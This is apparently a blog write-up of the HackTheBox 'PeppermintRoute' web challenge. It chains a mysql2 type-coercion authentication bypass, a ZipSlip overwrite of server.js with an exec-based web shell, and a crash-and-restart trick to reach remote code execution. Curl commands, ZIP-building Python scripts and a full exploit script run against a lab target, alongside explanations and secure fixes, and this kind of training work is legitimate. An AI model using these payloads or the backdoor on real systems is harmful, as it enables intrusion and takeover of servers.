---
layout: post
title: "PeppermintRoute CTF Writeup"
date: 2025-12-22 13:05:00 +0300
categories: [HackTheBox, CTFs]
tags: [cybersecurity, web, hackthebox, sqli, zipslip, rce, nodejs]
---

# 🎄 PeppermintRoute CTF Writeup

Today I'll walk you through my process of solving the **PeppermintRoute** web challenge. This is a Medium difficulty challenge that involves chaining multiple vulnerabilities to achieve RCE. Let's dive in!

---

## 📋 Challenge Overview

| Property | Value |
|----------|-------|
| **Name** | PeppermintRoute |
| **Category** | Web |
| **Difficulty** | Medium |

The challenge provides a Node.js web application for managing sleigh routes. It uses **Express**, **MySQL**, and a custom `ZipParser` utility. The goal is to exploit vulnerabilities to read the flag from `/root/flag.txt` via a provided SUID binary `/readflag`.

---

## 🏗️ Application Architecture

The application structure:

```
app/
├── server.js              # Main Express server
├── controllers/
│   ├── authController.js  # Login/logout handling
│   ├── adminController.js # Admin file upload
│   └── fileController.js  # File download
├── utils/
│   └── zipParser.js       # Custom ZIP extraction
└── models/
    └── mysqldb.js         # Database queries
```

Key configuration in `server.js`:

```javascript
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
```

> ⚠️ Notice `extended: true` - this allows parsing **nested objects** in request bodies!
{: .prompt-warning }

---

## 🔎 Vulnerability Analysis

### 1. Authentication Bypass (SQL Injection via Type Coercion)

The application uses `mysql2` with `body-parser` configured with `extended: true`. This allows passing **objects** in the POST body.

In [authController.js](https://github.com/dogujen/dogujen.github.io), the login function:

```javascript
exports.postLogin = async (req, res) => {
    const { username, password } = req.body;

    if (username && password) {
        try {
            const results = await query(
                'SELECT * FROM users WHERE username = ? AND password = ?',
                [username, password]
            );

            if (results.length > 0) {
                const user = results[0];
                req.session.userId = user.id;
                req.session.username = user.username;
                req.session.role = user.role;
                // ... redirect based on role
            }
        } catch (error) {
            // ...
        }
    }
};
```

While parameterized queries prevent traditional SQLi, the `mysql2` library has interesting behavior when you pass an **object** instead of a string.

#### 🧪 How Type Coercion Works

When you send:
```json
{
    "username": {"role": "user"},
    "password": {"role": "user"}
}
```

The `mysql2` library tries to convert the object `{"role": "user"}` to a string for the query. In MySQL's context, this object gets compared in a way that results in the value `0`.

**Why does this work?**

In MySQL, when comparing a string to an integer:
- `'admin_xyz123' = 0` → **TRUE** (string starting with letter casts to 0)
- `'password_abc' = 0` → **TRUE** (same reason)

So the query effectively becomes:
```sql
SELECT * FROM users WHERE username = 0 AND password = 0
```

Since all usernames and passwords start with letters (e.g., `admin_...`, `pilot_...`), they all cast to `0`, and the first user (admin) is returned!

> 💡 This is a lesser-known attack vector. Even "safe" parameterized queries can be vulnerable when type handling is abused.
{: .prompt-tip }

---

### 2. ZipSlip (Arbitrary File Write)

The developer created a custom `ZipParser` class (to avoid "supply chain attacks" 😅):

```javascript
/*
    Created my own zip parser because I'm afraid of those supply chain attacks.
*/

class ZipParser {
    // ...
    
    extractAll(destDir) {
        const entries = this.findEntries();
        const extractedFiles = [];

        for (const entry of entries) {
            try {
                // "Security" check - only prevents deep nesting
                const parts = entry.fileName.split('/').filter(p => p);
                if (parts.length > 4) {
                    console.error(`Path too deep: ${entry.fileName}`);
                    continue;
                }

                // VULNERABLE: No path traversal check!
                const fullPath = path.join(destDir, entry.fileName);

                const dir = path.dirname(fullPath);
                if (!fs.existsSync(dir)) {
                    fs.mkdirSync(dir, { recursive: true });
                }

                // ... extract and write file
                extractedFiles.push(fullPath);
                fs.writeFileSync(fullPath, content);

            } catch (e) {
                console.error(`Error extracting ${entry.fileName}: ${e.message}`);
            }
        }
        return extractedFiles;
    }
}
```

#### 🐛 The Bug

The "security" check only counts path segments:
```javascript
const parts = entry.fileName.split('/').filter(p => p);
if (parts.length > 4) { continue; }
```

A malicious filename like `../../../server.js` splits into:
- `..` → segment 1
- `..` → segment 2  
- `..` → segment 3
- `server.js` → segment 4

**Only 4 segments!** The check passes, and `path.join()` resolves the traversal:

```javascript
path.join('/app/data/uploads/recipient', '../../../server.js')
// → '/app/server.js'
```

> 🎯 Classic ZipSlip vulnerability - always validate that extracted paths stay within the intended directory!
{: .prompt-danger }

---

### 3. Server Crash (Unhandled Stream Error)

To make the backdoor work, we need to **restart the server** so it loads our malicious `server.js`. The app runs under `supervisord` which auto-restarts crashed processes.

In `fileController.js`:

```javascript
exports.downloadAttachment = async (req, res) => {
    try {
        const { fileId } = req.query;
        // ... validation ...
        
        const filePath = fileRecord.filepath;
        
        // Path traversal check (looks secure!)
        const resolvedFilePath = path.resolve(filePath);
        const uploadsDir = path.resolve('/app/data/uploads');
        if (!resolvedFilePath.startsWith(uploadsDir + path.sep)) {
            return res.status(403).json({ error: 'Access denied: Invalid file location' });
        }

        res.setHeader('Content-Disposition', `attachment; filename="${fileRecord.filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');

        // VULNERABLE: No error handler on stream!
        const fileStream = fs.createReadStream(filePath);
        fileStream.pipe(res);
        
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ error: 'Error downloading file' });
    }
};
```

#### 💥 The Crash Vector

The `try/catch` only catches **synchronous** errors. But `fs.createReadStream()` operates asynchronously and emits errors through events.

If `filePath` points to a **directory**, the stream emits an `error` event:

```
Error: EISDIR: illegal operation on a directory, read
```

Since there's no `.on('error', ...)` handler, this becomes an **unhandled exception** and crashes Node.js!

#### 🎭 How to Create a Directory Entry

Looking at `adminController.js`:

```javascript
for (const file of req.files) {
    if (file.originalname.endsWith('.zip')) {
        const parser = new ZipParser(zipPath);
        const extractedFiles = parser.extractAll(extractDir);

        // Files are added to DB AFTER extraction
        for (const filePath of extractedFiles) {
            const fileName = path.basename(filePath);
            await query(
                `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
                 VALUES (?, ?, ?, ?)`,
                [fileId, recipient, fileName, filePath]
            );
        }
    }
}
```

The trick:
1. ZIP entry `crash_me/placeholder.txt` creates directory `crash_me/`
2. ZIP entry `crash_me` (file) tries to overwrite the directory → **fails**
3. But `extractedFiles.push(fullPath)` happens **before** `writeFileSync`
4. So `crash_me` (the directory path) gets added to the database!

Downloading `crash_me` → `createReadStream` on directory → 💥 **CRASH**

---

## 🚀 Exploitation Steps

### Step 1: Login as Admin

Send a POST request to `/login` with the JSON payload:

```bash
curl -X POST "http://TARGET:PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"role": "user"}, "password": {"role": "user"}}' \
  -c admin_cookies.txt -v
```

Response:
```
< HTTP/1.1 302 Found
< Set-Cookie: connect.sid=s%3Axxxxxxxxx...; Path=/; HttpOnly
< Location: /admin/dashboard
```

We're redirected to admin dashboard! 🎉

---

### Step 2: Get Pilot Credentials

We need a pilot account because the download endpoint in `fileController.js` checks:

```javascript
if (packageResults[0].assigned_to !== req.session.username) {
    return res.status(403).json({ error: 'Access denied' });
}
```

Only the assigned pilot can download files. Let's get pilot usernames:

```bash
curl -X GET "http://TARGET:PORT/api/admin/pilots-data" \
  -b admin_cookies.txt
```

Response:
```json
{
    "pilots": [
        {
            "id": 2,
            "username": "pilot_aurora_ae52c6c717b5ae33801d91ab51189b02",
            "destination": "Northern Lights Station"
        },
        // ... more pilots
    ]
}
```

Login as a pilot using the same type coercion trick:

```bash
curl -X POST "http://TARGET:PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "pilot_aurora_ae52c6c717b5ae33801d91ab51189b02", "password": {"role": "admin"}}' \
  -c pilot_cookies.txt
```

> 💡 Here we use the **exact username** but still bypass password check with the object payload.
{: .prompt-info }

---

### Step 3: Overwrite `server.js` with Backdoor

The upload flow in `adminController.js`:

```javascript
exports.uploadFiles = async (req, res) => {
    const { recipient } = req.params;
    
    for (const file of req.files) {
        if (file.originalname.endsWith('.zip')) {
            const zipPath = file.path;
            const extractDir = path.dirname(zipPath);  // /app/data/uploads/recipient/
            
            const parser = new ZipParser(zipPath);
            const extractedFiles = parser.extractAll(extractDir);
            // ...
        }
    }
};
```

Files are extracted to `/app/data/uploads/{recipient}/`. With ZipSlip, we can write to:

```
/app/data/uploads/clarion/../../../server.js
        ↓ resolves to ↓
/app/server.js
```

**Python script to create malicious ZIP:**

```python
import zipfile
import io

backdoor_code = '''const express = require('express');
const { exec } = require('child_process');
const app = express();

// Simple command execution backdoor
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (err, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});

app.listen(3000, '0.0.0.0');
'''

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
    # ZipSlip payload - escape 3 directories to reach /app/
    zf.writestr('../../../server.js', backdoor_code)

with open('backdoor.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
    
print("[+] backdoor.zip created!")
```

Upload via admin panel:

```bash
curl -X POST "http://TARGET:PORT/admin/recipients/clarion/upload" \
  -b admin_cookies.txt \
  -F "file=@backdoor.zip"
```

At this point, `/app/server.js` is overwritten but the OLD code is still running in memory. We need to crash the server!

---

### Step 4: Trigger Server Crash

**Python script to create crash ZIP:**

```python
import zipfile
import io

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
    # First: create a directory
    zf.writestr('crash_me/placeholder.txt', 'x')
    
    # Second: try to write a FILE with same name as directory
    # This will fail, but path gets added to extractedFiles BEFORE writeFileSync
    zf.writestr('crash_me', 'x')

with open('crash.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
    
print("[+] crash.zip created!")
```

**Why this works - detailed code flow:**

```javascript
// In ZipParser.extractAll()
for (const entry of entries) {
    const fullPath = path.join(destDir, entry.fileName);
    
    // For 'crash_me/placeholder.txt' → creates directory 'crash_me/'
    // For 'crash_me' → fullPath points to existing directory
    
    extractedFiles.push(fullPath);  // ← Added BEFORE write attempt!
    
    fs.writeFileSync(fullPath, content);  // ← FAILS for directory!
}
return extractedFiles;  // Contains 'crash_me' (the directory path)
```

Upload crash ZIP and trigger:

```bash
# Upload crash.zip
curl -X POST "http://TARGET:PORT/admin/recipients/clarion/upload" \
  -b admin_cookies.txt \
  -F "file=@crash.zip"

# Get the fileId for 'crash_me'
curl "http://TARGET:PORT/api/admin/package/clarion" \
  -b admin_cookies.txt | jq '.files[] | select(.filename=="crash_me")'

# Trigger crash with pilot session
curl "http://TARGET:PORT/user/packages/clarion/download?fileId=CRASH_FILE_ID" \
  -b pilot_cookies.txt
```

The server crashes with:
```
Error: EISDIR: illegal operation on a directory, read
```

**supervisord** detects the crash and restarts the server → loads our backdoored `server.js`! 💥

---

### Step 5: Read Flag 🏁

Wait a few seconds for the server to restart, then:

```bash
curl "http://TARGET:PORT/backdoor?cmd=/readflag"
```

```
HTB{.....}
```

**Flag captured!** 🎄🚩

---

## 🛡️ Vulnerability Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN VISUALIZATION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Type Coercion SQLi          2. ZipSlip                      │
│  ┌──────────────────┐           ┌──────────────────┐            │
│  │ POST /login      │           │ Upload backdoor  │            │
│  │ {"user": {...}}  │ ────────► │ ../../../server  │            │
│  │ Bypass Auth      │           │ Overwrite file   │            │
│  └──────────────────┘           └──────────────────┘            │
│           │                              │                       │
│           ▼                              ▼                       │
│  ┌──────────────────┐           ┌──────────────────┐            │
│  │ Admin + Pilot    │           │ 3. Crash Server  │            │
│  │ Sessions         │           │ Download dir     │            │
│  └──────────────────┘           │ Unhandled error  │            │
│                                 └──────────────────┘            │
│                                          │                       │
│                                          ▼                       │
│                                 ┌──────────────────┐            │
│                                 │ 4. RCE via       │            │
│                                 │ /backdoor?cmd=   │            │
│                                 │ /readflag        │            │
│                                 └──────────────────┘            │
│                                          │                       │
│                                          ▼                       │
│                                      🚩 FLAG                     │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🧠 Key Takeaways

### For Developers:

1. **Never trust `body-parser` with `extended: true`** - validate input types explicitly
2. **ZipSlip is still common** - always use `path.resolve()` and check if output stays in target directory
3. **Handle ALL stream errors** - use `.on('error', handler)` on every stream
4. **The `try/catch` myth** - it doesn't catch async/event-based errors

### Secure ZipParser Fix:

```javascript
extractAll(destDir) {
    const resolvedDest = path.resolve(destDir);
    
    for (const entry of entries) {
        const fullPath = path.resolve(destDir, entry.fileName);
        
        // SECURITY: Ensure path stays within destination
        if (!fullPath.startsWith(resolvedDest + path.sep)) {
            console.error(`Path traversal attempt: ${entry.fileName}`);
            continue;
        }
        
        // ... rest of extraction
    }
}
```

### Secure Stream Fix:

```javascript
const fileStream = fs.createReadStream(filePath);
fileStream.on('error', (err) => {
    console.error('Stream error:', err);
    res.status(500).json({ error: 'Error reading file' });
});
fileStream.pipe(res);
```

---

## 🔧 Full Exploit Script

```python
import requests
import zipfile
import io
import time

TARGET = "http://TARGET:PORT"

def create_backdoor_zip():
    backdoor_code = '''const express = require('express');
const { exec } = require('child_process');
const app = express();
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (err, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});
app.listen(3000, '0.0.0.0');
'''
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr('../../../server.js', backdoor_code)
    return zip_buffer.getvalue()

def create_crash_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr('crash_me/placeholder.txt', 'x')
        zf.writestr('crash_me', 'x')
    return zip_buffer.getvalue()

# Step 1: Login as Admin
admin_session = requests.Session()
admin_session.post(f"{TARGET}/login", json={
    "username": {"role": "user"},
    "password": {"role": "user"}
})

# Step 2: Get pilot username and login
pilots = admin_session.get(f"{TARGET}/api/admin/pilots-data").json()
pilot_username = pilots['pilots'][0]['username']

pilot_session = requests.Session()
pilot_session.post(f"{TARGET}/login", json={
    "username": pilot_username,
    "password": {"role": "admin"}
})

# Step 3: Upload backdoor
admin_session.post(
    f"{TARGET}/admin/recipients/clarion/upload",
    files={'file': ('backdoor.zip', create_backdoor_zip(), 'application/zip')}
)

# Step 4: Upload crash and trigger
admin_session.post(
    f"{TARGET}/admin/recipients/clarion/upload",
    files={'file': ('crash.zip', create_crash_zip(), 'application/zip')}
)

# Get fileId for crash_me
package_data = admin_session.get(f"{TARGET}/api/admin/package/clarion").json()
crash_file_id = [f['id'] for f in package_data['files'] if f['filename'] == 'crash_me'][0]

# Trigger crash
try:
    pilot_session.get(f"{TARGET}/user/packages/clarion/download?fileId={crash_file_id}", timeout=2)
except:
    pass

# Step 5: Wait and get flag
time.sleep(3)
flag = requests.get(f"{TARGET}/backdoor?cmd=/readflag").text
print(f"FLAG: {flag}")
```

---

Thanks for reading! 🎄  

